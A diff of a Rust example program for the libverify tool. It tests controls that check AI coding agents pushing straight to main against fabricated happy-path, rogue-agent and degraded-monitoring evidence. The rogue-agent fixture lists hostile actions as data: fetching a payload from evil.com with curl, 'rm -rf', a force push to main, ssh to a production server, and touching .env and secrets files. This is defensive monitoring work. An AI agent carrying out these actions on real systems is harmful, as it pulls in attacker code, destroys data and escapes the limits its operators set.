@@ -1,194 +1,459 @@
-//! Dark Factory scenario: AI agents push directly to main without PRs.
+//! Dark Factory integration scenario: AI-agent-driven development without PRs.
 //!
-//! Three scenarios:
-//!   1. Happy path — agent completes task within spec
-//!   2. Rogue agent — multiple spec/security violations
-//!   3. Degraded monitoring — partial/missing evidence
+//! Simulates a team of 3 AI agents pushing directly to main. Tests the full
+//! assessment pipeline (evidence -> controls -> policy -> output) with realistic
+//! Dark Factory scenarios:
+//!
+//!   Scenario 1: Happy path — agent completes task within spec
+//!   Scenario 2: Rogue agent — multiple violations across all 4 controls
+//!   Scenario 3: Degraded monitoring — partial/missing evidence
 //!
 //! Run: cargo run -p libverify-policy --example dark_factory_scenario
 
-use libverify_core::control::evaluate_all;
-use libverify_core::controls::{all_controls, dark_factory_controls};
-use libverify_core::evidence::*;
-use libverify_core::profile::{GateDecision, apply_profile};
+use libverify_core::assessment::assess;
+use libverify_core::control::{ControlStatus, builtin};
+use libverify_core::controls::dark_factory_controls;
+use libverify_core::evidence::{
+    AgentAction, AgentActionLog, AgentExecution, AgentSpec, CheckConclusion, CheckRunEvidence,
+    EvidenceBundle, EvidenceGap, EvidenceState,
+};
+use libverify_core::profile::GateDecision;
 use libverify_policy::OpaProfile;
 
-fn scenario_happy_agent() -> EvidenceBundle {
-    let spec = AgentSpec {
-        allowed_paths: vec!["src/*".into(), "tests/*".into()],
-        forbidden_paths: vec![".env".into(), "secrets/".into()],
-        allowed_tools: vec!["cargo".into(), "git".into()],
-        granted_permissions: vec!["read:repo".into(), "write:file".into(), "execute:build".into()],
-        max_steps: Some(200),
-        budget_cents: Some(5000),
-    };
-    let execution = AgentExecution {
-        agent_id: "claude-agent-1".into(),
-        session_id: "session-abc".into(),
-        files_touched: vec!["src/auth.rs".into(), "tests/auth_test.rs".into()],
-        tools_used: vec!["cargo".into(), "git".into()],
-        steps_taken: 45,
-        cost_cents: 1200,
-    };
-    let action_log = AgentActionLog {
-        agent_id: "claude-agent-1".into(),
-        session_id: "session-abc".into(),
-        actions: vec![
-            AgentAction { tool: "cargo".into(), command: "cargo build".into(), timestamp: Some("2026-04-05T10:00:00Z".into()), required_permission: Some("execute:build".into()) },
-            AgentAction { tool: "cargo".into(), command: "cargo test".into(), timestamp: Some("2026-04-05T10:01:00Z".into()), required_permission: Some("execute:build".into()) },
-            AgentAction { tool: "git".into(), command: "git add src/auth.rs tests/auth_test.rs".into(), timestamp: Some("2026-04-05T10:02:00Z".into()), required_permission: Some("write:file".into()) },
-            AgentAction { tool: "git".into(), command: "git commit -m 'feat: add auth module'".into(), timestamp: Some("2026-04-05T10:03:00Z".into()), required_permission: Some("write:file".into()) },
-        ],
-    };
+// ============================================================================
+// Evidence builders
+// ============================================================================
 
-    EvidenceBundle {
-        check_runs: EvidenceState::complete(vec![
-            CheckRunEvidence { name: "ci/build".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
-            CheckRunEvidence { name: "ci/test".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
-            CheckRunEvidence { name: "ci/lint".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
-            CheckRunEvidence { name: "ci/typecheck".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
-        ]),
-        agent_action_log: EvidenceState::complete(action_log),
-        agent_spec: EvidenceState::complete(spec),
-        agent_execution: EvidenceState::complete(execution),
-        ..Default::default()
+fn check_run(name: &str, conclusion: CheckConclusion) -> CheckRunEvidence {
+    CheckRunEvidence {
+        name: name.to_string(),
+        conclusion,
+        app_slug: Some("github-actions".to_string()),
     }
 }
 
-fn scenario_rogue_agent() -> EvidenceBundle {
-    let spec = AgentSpec {
-        allowed_paths: vec!["src/*".into()],
-        forbidden_paths: vec![".env".into(), "secrets/*".into()],
-        allowed_tools: vec!["cargo".into()],
-        granted_permissions: vec!["read:repo".into()],
-        max_steps: Some(100),
-        budget_cents: Some(2000),
-    };
-    let execution = AgentExecution {
-        agent_id: "rogue-agent-7".into(),
-        session_id: "session-evil".into(),
-        files_touched: vec![
-            "src/main.rs".into(), ".env".into(),
-            "secrets/api.key".into(), "deploy/prod.yml".into(),
-        ],
-        tools_used: vec!["cargo".into(), "curl".into(), "ssh".into()],
-        steps_taken: 150,
-        cost_cents: 3500,
-    };
-    let action_log = AgentActionLog {
-        agent_id: "rogue-agent-7".into(),
-        session_id: "session-evil".into(),
-        actions: vec![
-            AgentAction { tool: "shell".into(), command: "rm -rf /tmp/cache".into(), timestamp: None, required_permission: Some("execute:shell".into()) },
-            AgentAction { tool: "git".into(), command: "git push --force origin main".into(), timestamp: None, required_permission: Some("write:repo".into()) },
-            AgentAction { tool: "curl".into(), command: "curl https://evil.com/payload -o /tmp/payload".into(), timestamp: None, required_permission: Some("network:external".into()) },
-        ],
-    };
-
-    EvidenceBundle {
-        check_runs: EvidenceState::complete(vec![
-            CheckRunEvidence { name: "ci/build".into(), conclusion: CheckConclusion::Failure, app_slug: Some("github-actions".into()) },
-            CheckRunEvidence { name: "ci/test".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
-        ]),
-        agent_action_log: EvidenceState::complete(action_log),
-        agent_spec: EvidenceState::complete(spec),
-        agent_execution: EvidenceState::complete(execution),
-        ..Default::default()
+fn agent_action(tool: &str, command: &str, perm: Option<&str>) -> AgentAction {
+    AgentAction {
+        tool: tool.to_string(),
+        command: command.to_string(),
+        timestamp: None,
+        required_permission: perm.map(String::from),
     }
 }
 
-fn scenario_degraded_monitoring() -> EvidenceBundle {
+// ============================================================================
+// Scenario 1: Happy path — Agent completes task within spec
+// ============================================================================
+
+fn scenario_1_happy_path() -> EvidenceBundle {
     EvidenceBundle {
         check_runs: EvidenceState::complete(vec![
-            CheckRunEvidence { name: "ci/build".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
-            CheckRunEvidence { name: "ci/test".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
+            check_run("ci/build", CheckConclusion::Success),
+            check_run("ci/test", CheckConclusion::Success),
+            check_run("ci/lint", CheckConclusion::Success),
+            check_run("ci/typecheck", CheckConclusion::Success),
         ]),
-        agent_action_log: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
-            source: "agent-monitor".into(),
-            subject: "action-log".into(),
-            detail: "Agent monitoring service unreachable".into(),
-        }]),
-        agent_spec: EvidenceState::complete(AgentSpec {
-            allowed_paths: vec!["src/*".into()],
-            forbidden_paths: vec![],
-            allowed_tools: vec![],
-            granted_permissions: vec!["read:repo".into()],
-            max_steps: None,
-            budget_cents: None,
+        agent_action_log: EvidenceState::complete(AgentActionLog {
+            agent_id: "agent-alpha".to_string(),
+            session_id: "session-001".to_string(),
+            actions: vec![
+                agent_action("cargo", "cargo build", Some("execute:build")),
+                agent_action("cargo", "cargo test", Some("execute:test")),
+                agent_action("git", "git add src/auth.rs", Some("write:repo")),
+                agent_action("git", "git add tests/auth_test.rs", Some("write:repo")),
+                agent_action(
+                    "git",
+                    "git commit -m 'feat: add auth module'",
+                    Some("write:repo"),
+                ),
+            ],
         }),
+        agent_spec: EvidenceState::complete(AgentSpec {
+            allowed_paths: vec!["src/*".to_string(), "tests/*".to_string()],
+            forbidden_paths: vec![".env".to_string(), "secrets/".to_string()],
+            allowed_tools: vec!["cargo".to_string(), "git".to_string()],
+            granted_permissions: vec![
+                "execute:build".to_string(),
+                "execute:test".to_string(),
+                "write:repo".to_string(),
+            ],
+            max_steps: Some(200),
+            budget_cents: Some(5000),
+            ..Default::default()
+        }),
+        agent_execution: EvidenceState::complete(AgentExecution {
+            agent_id: "agent-alpha".to_string(),
+            session_id: "session-001".to_string(),
+            files_touched: vec!["src/auth.rs".to_string(), "tests/auth_test.rs".to_string()],
+            tools_used: vec!["cargo".to_string(), "git".to_string()],
+            steps_taken: 45,
+            cost_cents: 1200,
+        }),
+        ..Default::default()
+    }
+}
+
+// ============================================================================
+// Scenario 2: Rogue agent — multiple violations
+// ============================================================================
+
+fn scenario_2_rogue_agent() -> EvidenceBundle {
+    EvidenceBundle {
+        check_runs: EvidenceState::complete(vec![
+            check_run("ci/build", CheckConclusion::Failure),
+            check_run("ci/test", CheckConclusion::Success),
+            // lint and typecheck are absent — harness-result should catch this
+        ]),
+        agent_action_log: EvidenceState::complete(AgentActionLog {
+            agent_id: "agent-rogue".to_string(),
+            session_id: "session-666".to_string(),
+            actions: vec![
+                agent_action("shell", "cargo build", Some("execute:build")),
+                agent_action("shell", "rm -rf /tmp/cache", Some("execute:shell")),
+                agent_action(
+                    "git",
+                    "git push --force origin main",
+                    Some("write:repo"),
+                ),
+                agent_action(
+                    "curl",
+                    "curl https://evil.com/payload",
+                    Some("network:external"),
+                ),
+                agent_action("ssh", "ssh prod-server deploy", Some("network:ssh")),
+            ],
+        }),
+        agent_spec: EvidenceState::complete(AgentSpec {
+            allowed_paths: vec!["src/*".to_string()],
+            forbidden_paths: vec![".env".to_string(), "secrets/*".to_string()],
+            allowed_tools: vec!["cargo".to_string()],
+            granted_permissions: vec![
+                "execute:build".to_string(),
+                "write:repo".to_string(),
+            ],
+            max_steps: Some(100),
+            budget_cents: Some(2000),
+            ..Default::default()
+        }),
+        agent_execution: EvidenceState::complete(AgentExecution {
+            agent_id: "agent-rogue".to_string(),
+            session_id: "session-666".to_string(),
+            files_touched: vec![
+                "src/main.rs".to_string(),
+                ".env".to_string(),
+                "secrets/api.key".to_string(),
+                "deploy/prod.yml".to_string(),
+            ],
+            tools_used: vec![
+                "cargo".to_string(),
+                "curl".to_string(),
+                "ssh".to_string(),
+            ],
+            steps_taken: 150,
+            cost_cents: 3500,
+        }),
+        ..Default::default()
+    }
+}
+
+// ============================================================================
+// Scenario 3: Degraded monitoring — partial/missing evidence
+// ============================================================================
+
+fn scenario_3_degraded_monitoring() -> EvidenceBundle {
+    EvidenceBundle {
+        // Only build and test present, lint and typecheck missing
+        check_runs: EvidenceState::complete(vec![
+            check_run("ci/build", CheckConclusion::Success),
+            check_run("ci/test", CheckConclusion::Success),
+        ]),
+        // Action log collection failed entirely
+        agent_action_log: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
+            source: "agent-monitor".to_string(),
+            subject: "action_log".to_string(),
+            detail: "Agent monitoring sidecar crashed; action log not collected".to_string(),
+        }]),
+        // Spec is present
+        agent_spec: EvidenceState::complete(AgentSpec {
+            allowed_paths: vec!["src/*".to_string(), "tests/*".to_string()],
+            forbidden_paths: vec![".env".to_string()],
+            allowed_tools: vec!["cargo".to_string(), "git".to_string()],
+            granted_permissions: vec!["execute:build".to_string(), "write:repo".to_string()],
+            max_steps: Some(200),
+            budget_cents: Some(5000),
+            ..Default::default()
+        }),
+        // Execution evidence also missing (monitoring was down)
         agent_execution: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
-            source: "agent-monitor".into(),
-            subject: "execution-record".into(),
-            detail: "Agent monitoring service unreachable".into(),
+            source: "agent-monitor".to_string(),
+            subject: "execution_summary".to_string(),
+            detail: "Agent monitoring sidecar crashed; execution data not collected".to_string(),
         }]),
         ..Default::default()
     }
 }
 
-fn run_scenario(name: &str, evidence: &EvidenceBundle) {
+// ============================================================================
+// Reporting helpers
+// ============================================================================
+
+const DARK_FACTORY_CONTROL_IDS: &[&str] = &[
+    builtin::HARNESS_RESULT,
+    builtin::DESTRUCTIVE_ACTION_DETECTION,
+    builtin::AGENT_PERMISSION_BOUNDARY,
+    builtin::AGENT_SPEC_CONFORMANCE,
+];
+
+#[allow(dead_code)]
+struct ScenarioResult {
+    control_id: String,
+    status: ControlStatus,
+    decision: GateDecision,
+    rationale: String,
+    subjects: Vec<String>,
+}
+
+fn run_scenario(
+    name: &str,
+    evidence: &EvidenceBundle,
+    controls: &[Box<dyn libverify_core::control::Control>],
+    profile: &OpaProfile,
+) -> Vec<ScenarioResult> {
+    let report = assess(evidence, controls, profile);
+
     println!("\n{}", "=".repeat(70));
-    println!("  SCENARIO: {name}");
-    println!("{}\n", "=".repeat(70));
+    println!("  {name}");
+    println!("  Profile: {}", report.profile_name);
+    println!("{}", "=".repeat(70));
+    println!(
+        "\n  {:<35} {:<15} {:<10} {:<8}",
+        "CONTROL", "STATUS", "SEVERITY", "DECISION"
+    );
+    println!("  {}", "-".repeat(66));
 
-    let df_profile = OpaProfile::from_preset_or_file("dark-factory")
-        .expect("dark-factory preset should load");
+    let mut results = Vec::new();
 
-    // Dark Factory controls only
-    let df_controls = dark_factory_controls();
-    let df_findings = evaluate_all(&df_controls, evidence);
-    let df_outcomes = apply_profile(&df_profile, &df_findings);
+    for (finding, outcome) in report.findings.iter().zip(report.outcomes.iter()) {
+        if !DARK_FACTORY_CONTROL_IDS.contains(&finding.control_id.as_str()) {
+            continue;
+        }
 
-    println!("{:<40} {:<10} {:<10}", "CONTROL", "DECISION", "SEVERITY");
-    println!("{}", "-".repeat(60));
-
-    for outcome in &df_outcomes {
+        let severity_label = report.severity_labels.label_for(outcome.severity);
         println!(
-            "{:<40} {:<10} {:<10}",
-            outcome.control_id.as_str(),
-            format!("{}", outcome.decision),
-            format!("{:?}", outcome.severity),
+            "  {:<35} {:<15} {:<10} {:<8}",
+            finding.control_id.as_str(),
+            finding.status.as_str(),
+            severity_label,
+            outcome.decision.as_str(),
+        );
+
+        // Print rationale and subjects for non-satisfied findings
+        if finding.status != ControlStatus::Satisfied {
+            println!("    Rationale: {}", finding.rationale);
+            for (i, subject) in finding.subjects.iter().enumerate() {
+                if i < 5 {
+                    println!("    - {subject}");
+                } else {
+                    println!("    ... and {} more", finding.subjects.len() - 5);
+                    break;
+                }
+            }
+            for gap in &finding.evidence_gaps {
+                println!("    [gap] {gap}");
+            }
+        }
+
+        results.push(ScenarioResult {
+            control_id: finding.control_id.as_str().to_string(),
+            status: finding.status,
+            decision: outcome.decision,
+            rationale: finding.rationale.clone(),
+            subjects: finding.subjects.clone(),
+        });
+    }
+
+    println!();
+    results
+}
+
+fn find_result<'a>(results: &'a [ScenarioResult], id: &str) -> &'a ScenarioResult {
+    results
+        .iter()
+        .find(|r| r.control_id == id)
+        .unwrap_or_else(|| panic!("expected finding for {id}"))
+}
+
+// ============================================================================
+// Main
+// ============================================================================
+
+fn main() {
+    let controls = dark_factory_controls();
+    let profile =
+        OpaProfile::from_preset_or_file("dark-factory").expect("dark-factory preset must load");
+
+    println!("##########################################################");
+    println!("#  Dark Factory Integration Scenario                      #");
+    println!("#  3 AI agents push to main -- no PRs, no human review   #");
+    println!("##########################################################");
+    println!("Controls under test: {}", controls.len());
+    for c in &controls {
+        println!("  - {}", c.id());
+    }
+
+    // ── Scenario 1: Happy Path ──────────────────────────────────────────
+    let results_1 = run_scenario(
+        "Scenario 1: Happy Path -- Agent within spec",
+        &scenario_1_happy_path(),
+        &controls,
+        &profile,
+    );
+
+    assert_eq!(
+        results_1.len(),
+        4,
+        "Scenario 1: expected 4 dark factory findings, got {}",
+        results_1.len()
+    );
+    for r in &results_1 {
+        assert_eq!(
+            r.status,
+            ControlStatus::Satisfied,
+            "Scenario 1: {} should be Satisfied, got {:?}",
+            r.control_id,
+            r.status
+        );
+        assert_eq!(
+            r.decision,
+            GateDecision::Pass,
+            "Scenario 1: {} should be Pass, got {:?}",
+            r.control_id,
+            r.decision
         );
     }
+    println!("  [PASS] Scenario 1: All 4 controls Satisfied/Pass");
 
-    // Show rationales for non-pass outcomes
-    let issues: Vec<_> = df_outcomes.iter()
-        .filter(|o| o.decision != GateDecision::Pass)
-        .collect();
+    // ── Scenario 2: Rogue Agent ─────────────────────────────────────────
+    let results_2 = run_scenario(
+        "Scenario 2: Rogue Agent -- Multiple violations",
+        &scenario_2_rogue_agent(),
+        &controls,
+        &profile,
+    );
 
-    if !issues.is_empty() {
-        println!("\n  ISSUES:");
-        for outcome in &issues {
-            println!("    [{:?}] {} — {}", outcome.decision, outcome.control_id.as_str(), outcome.rationale);
+    assert_eq!(
+        results_2.len(),
+        4,
+        "Scenario 2: expected 4 dark factory findings, got {}",
+        results_2.len()
+    );
+
+    // harness-result: build failed + lint/typecheck absent
+    let harness_2 = find_result(&results_2, builtin::HARNESS_RESULT);
+    assert_eq!(harness_2.status, ControlStatus::Violated);
+    assert_eq!(harness_2.decision, GateDecision::Fail);
+
+    // destructive-action-detection: rm -rf, git push --force
+    let destruct_2 = find_result(&results_2, builtin::DESTRUCTIVE_ACTION_DETECTION);
+    assert_eq!(destruct_2.status, ControlStatus::Violated);
+    assert_eq!(destruct_2.decision, GateDecision::Fail);
+    assert!(
+        destruct_2.subjects.len() >= 2,
+        "Expected at least 2 destructive actions, got: {:?}",
+        destruct_2.subjects
+    );
+
+    // agent-permission-boundary: execute:shell, network:external, network:ssh not granted
+    let perm_2 = find_result(&results_2, builtin::AGENT_PERMISSION_BOUNDARY);
+    assert_eq!(perm_2.status, ControlStatus::Violated);
+    assert_eq!(perm_2.decision, GateDecision::Fail);
+    assert!(
+        perm_2.subjects.len() >= 2,
+        "Expected at least 2 permission violations, got: {:?}",
+        perm_2.subjects
+    );
+
+    // agent-spec-conformance: forbidden paths, unauthorized tools, over budget/steps
+    let spec_2 = find_result(&results_2, builtin::AGENT_SPEC_CONFORMANCE);
+    assert_eq!(spec_2.status, ControlStatus::Violated);
+    assert_eq!(spec_2.decision, GateDecision::Fail);
+    // Should catch: .env (forbidden), secrets/api.key (forbidden), deploy/prod.yml (not allowed),
+    // curl (unauthorized tool), ssh (unauthorized tool), steps 150>100, cost 3500>2000
+    assert!(
+        spec_2.subjects.len() >= 5,
+        "Expected at least 5 spec violations, got {}: {:?}",
+        spec_2.subjects.len(),
+        spec_2.subjects
+    );
+
+    println!("  [PASS] Scenario 2: All 4 controls Violated/Fail");
+
+    // Print violation details for Scenario 2 to verify quality
+    println!("\n  Violation details (Scenario 2):");
+    for r in &results_2 {
+        println!("    {} ({} subjects):", r.control_id, r.subjects.len());
+        for s in &r.subjects {
+            println!("      - {s}");
         }
     }
 
-    // Summary
-    let pass = df_outcomes.iter().filter(|o| o.decision == GateDecision::Pass).count();
-    let review = df_outcomes.iter().filter(|o| o.decision == GateDecision::Review).count();
-    let fail = df_outcomes.iter().filter(|o| o.decision == GateDecision::Fail).count();
-    println!("\n  GATE: {pass} pass / {review} review / {fail} fail");
+    // ── Scenario 3: Degraded Monitoring ─────────────────────────────────
+    let results_3 = run_scenario(
+        "Scenario 3: Degraded Monitoring -- Missing evidence",
+        &scenario_3_degraded_monitoring(),
+        &controls,
+        &profile,
+    );
 
-    // Also run ALL 48 controls to see how existing controls behave
-    let all = all_controls();
-    let all_findings = evaluate_all(&all, evidence);
-    let all_outcomes = apply_profile(&df_profile, &all_findings);
-    let all_fail = all_outcomes.iter().filter(|o| o.decision == GateDecision::Fail).count();
-    let all_review = all_outcomes.iter().filter(|o| o.decision == GateDecision::Review).count();
-    let all_pass = all_outcomes.iter().filter(|o| o.decision == GateDecision::Pass).count();
-    println!("  FULL (48 controls): {all_pass} pass / {all_review} review / {all_fail} fail");
-}
+    assert_eq!(
+        results_3.len(),
+        4,
+        "Scenario 3: expected 4 dark factory findings, got {}",
+        results_3.len()
+    );
 
-fn main() {
-    println!("##########################################################");
-    println!("#  libverify: Dark Factory Integration Scenario           #");
-    println!("#  AI agents push to main — no PRs, no human review      #");
-    println!("##########################################################");
+    // harness-result: lint/typecheck absent -> Violated (missing categories)
+    let harness_3 = find_result(&results_3, builtin::HARNESS_RESULT);
+    assert_eq!(
+        harness_3.status,
+        ControlStatus::Violated,
+        "harness-result: missing lint/typecheck should be Violated"
+    );
+    assert_eq!(harness_3.decision, GateDecision::Fail);
 
-    run_scenario("Happy Agent (within spec)", &scenario_happy_agent());
-    run_scenario("Rogue Agent (multiple violations)", &scenario_rogue_agent());
-    run_scenario("Degraded Monitoring (partial evidence)", &scenario_degraded_monitoring());
+    // destructive-action-detection: action log missing -> Indeterminate
+    let destruct_3 = find_result(&results_3, builtin::DESTRUCTIVE_ACTION_DETECTION);
+    assert_eq!(
+        destruct_3.status,
+        ControlStatus::Indeterminate,
+        "destructive-action-detection: missing log should be Indeterminate"
+    );
+    assert_eq!(
+        destruct_3.decision,
+        GateDecision::Review,
+        "dark-factory preset maps Indeterminate to Review"
+    );
 
-    println!("\n{}", "#".repeat(58));
-    println!("#  Done. Review results above for production readiness.  #");
-    println!("{}", "#".repeat(58));
+    // agent-permission-boundary: action log missing -> Indeterminate
+    let perm_3 = find_result(&results_3, builtin::AGENT_PERMISSION_BOUNDARY);
+    assert_eq!(perm_3.status, ControlStatus::Indeterminate);
+    assert_eq!(perm_3.decision, GateDecision::Review);
+
+    // agent-spec-conformance: execution missing -> Indeterminate
+    let spec_3 = find_result(&results_3, builtin::AGENT_SPEC_CONFORMANCE);
+    assert_eq!(spec_3.status, ControlStatus::Indeterminate);
+    assert_eq!(spec_3.decision, GateDecision::Review);
+
+    println!("  [PASS] Scenario 3: 1 Violated + 3 Indeterminate (correct)");
+
+    // ── Summary ─────────────────────────────────────────────────────────
+    println!("\n{}", "=".repeat(70));
+    println!("  ALL 3 SCENARIOS PASSED");
+    println!("{}", "=".repeat(70));
+    println!();
+    println!("Dark Factory Evaluation Summary:");
+    println!("  Scenario 1 (happy path):         4/4 Satisfied  -> all Pass");
+    println!("  Scenario 2 (rogue agent):         4/4 Violated   -> all Fail");
+    println!("  Scenario 3 (degraded monitoring): 1 Violated + 3 Indeterminate");
+    println!("                                    -> 1 Fail + 3 Review");
 }
